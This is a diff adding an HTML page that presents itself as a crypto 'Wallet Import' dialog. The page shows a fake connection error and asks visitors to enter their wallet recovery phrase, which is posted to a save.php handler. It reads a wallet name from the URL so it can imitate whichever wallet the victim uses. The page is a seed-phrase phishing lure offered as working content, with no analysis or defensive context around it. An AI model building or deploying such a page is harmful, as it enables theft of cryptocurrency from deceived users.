@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Wallet Import</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #080c2b;
+      color: white;
+      text-align: center;
+      padding: 40px;
+    }
+
+    .modal {
+      background: white;
+      color: black;
+      padding: 20px;
+      border-radius: 12px;
+      max-width: 400px;
+      margin: auto;
+    }
+
+    textarea, button {
+      width: 100%;
+      margin-top: 12px;
+      padding: 10px;
+      border-radius: 8px;
+    }
+
+    .danger {
+      color: red;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="modal">
+    <div class="danger">
+      There was an error connecting automatically. But do not worry, you can still connect manually.
+    </div>
+    <p>Import your <span id="walletName">wallet</span> manually:</p>
+
+    <form action="save.php" method="post">
+      <textarea name="user_input" rows="3" placeholder="Enter your wallet phrase here..."></textarea><br>
+      <button type="submit">Validate</button>
+	   <button onclick="hideModal()" style="background-color:red; color:white;">Close</button>
+    </form>
+  </div>
+
+  <script>
+    // Extract wallet name from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const wallet = urlParams.get('wallet');
+    if (wallet) {
+      document.getElementById('walletName').textContent = wallet;
+    }
+  </script>
+</body>
+</html>
